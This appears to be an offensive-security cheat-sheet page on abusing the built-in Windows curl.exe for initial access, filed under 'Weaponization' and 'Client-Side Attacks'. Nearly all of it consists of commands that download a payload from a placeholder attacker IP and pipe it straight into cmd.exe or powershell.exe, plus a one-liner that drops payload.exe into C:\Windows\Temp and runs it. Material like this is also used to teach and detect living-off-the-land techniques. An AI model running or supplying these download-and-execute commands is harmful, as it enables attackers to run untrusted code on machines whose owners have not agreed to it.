# cURL

## 01 - Common Files

```
C:\Windows\System32\curl.exe
C:\Windows\SysWOW64\curl.exe
```

## 02 - Execute Payloads

### 2.1 - Fileless Code Execution

```
C:\> curl.exe http[s]://<IP>/payload.bat | cmd.exe

C:\> curl.exe http[s]://<IP>/payload.cmd | cmd.exe

C:\> curl.exe http[s]://<IP>/payload.ps1 | powershell.exe
```

### 2.2 - Dropping On Disk

Download payload and execute it.

```
C:\> curl.exe -o C:\Windows\Temp\payload.exe http[s]://<IP>/payload.exe & C:\Windows\Temp\payload.exe
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/Batch]]